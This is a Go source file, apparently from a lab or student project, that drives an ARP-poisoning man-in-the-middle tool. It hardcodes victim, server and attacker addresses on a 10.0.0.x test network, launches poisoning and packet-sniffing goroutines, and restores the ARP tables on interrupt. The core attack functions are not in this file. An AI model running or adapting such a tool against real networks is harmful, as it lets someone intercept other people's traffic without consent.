package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
)

type global struct {
	victime_ip    net.IP
	serveur_ip    net.IP
	serveur_mac   net.HardwareAddr
	attaquant_mac net.HardwareAddr
	victime_mac   net.HardwareAddr
}

// func initGlob(ip_src net.IP, mac_src net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) *global {
// 	g := global{}
// 	g.victime_ip = ip_src
// 	g.victime_mac = mac_src
// 	g.serveur_ip = ip_target
// 	g.serveur_mac = mac_target
// 	g.attaquant_mac = getMymac()
// 	return &g
// }

func initFakeGlob() *global {
	// attaquant_ip := net.ParseIP("10.0.0.30")
	attaquant_mac, _ := net.ParseMAC("02:42:0a:00:00:0c")
	victime_ip := net.ParseIP("10.0.0.20")
	victime_mac, _ := net.ParseMAC("02:42:0A:00:00:0B")
	serveur_ip := net.ParseIP("10.0.0.10")
	serveur_mac, _ := net.ParseMAC("02:42:0A:00:00:0A")
	g := global{}
	g.victime_ip = victime_ip
	g.victime_mac = victime_mac
	g.serveur_ip = serveur_ip
	g.serveur_mac = serveur_mac
	g.attaquant_mac = attaquant_mac
	return &g
}

func main() {
	typeToFilter := flag.String("f", "", "Type to filter ex: Arp")
	flag.Parse()

	// // attaquant_ip := net.ParseIP("10.0.0.30")
	// attaquant_mac, _ := net.ParseMAC("02:42:0a:00:00:0c")
	//
	// victime_ip := net.ParseIP("10.0.0.20")
	// victime_mac, _ := net.ParseMAC("02:42:0A:00:00:0B")
	//
	// serveur_ip := net.ParseIP("10.0.0.10")
	// serveur_mac, _ := net.ParseMAC("02:42:0A:00:00:0A")

	// ip_target := serveur_ip
	// mac_target := serveur_mac
	// ip_src := victime_ip
	// mac_src := attaquant_mac

	// A decommenter apres pour faire les param par arg
	// -------------------------------------------------------
	// var ip_src string
	// var mac_src string
	// var ip_target string
	// var mac_target string

	// if !setup(&ip_src, &mac_src, &ip_target, &mac_target) {
	// 	return
	// }
	// global := initGlob(net.ParseIP(ip_src), net.ParseMAC(mac_src), net.ParseIP(ip_target), net.ParseMAC(mac_target))
	// -------------------------------------------------------
	global := initFakeGlob()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		c := make(chan os.Signal, 1)
		signal.Notify(c, os.Interrupt)
		<-c
		signal.Reset()
		cancel()
		printRecuperation(3)
		launchRecuperationOneWay(global)
		launchRecuperationOtherWay(global)
		fmt.Println("CLEANING DONE")
		os.Exit(0)
	}()
	go launchPoisoning(global, ctx)
	go launchSniffing(*typeToFilter, global, ctx)

	for {
		// je bloque le processus principal
	}

}
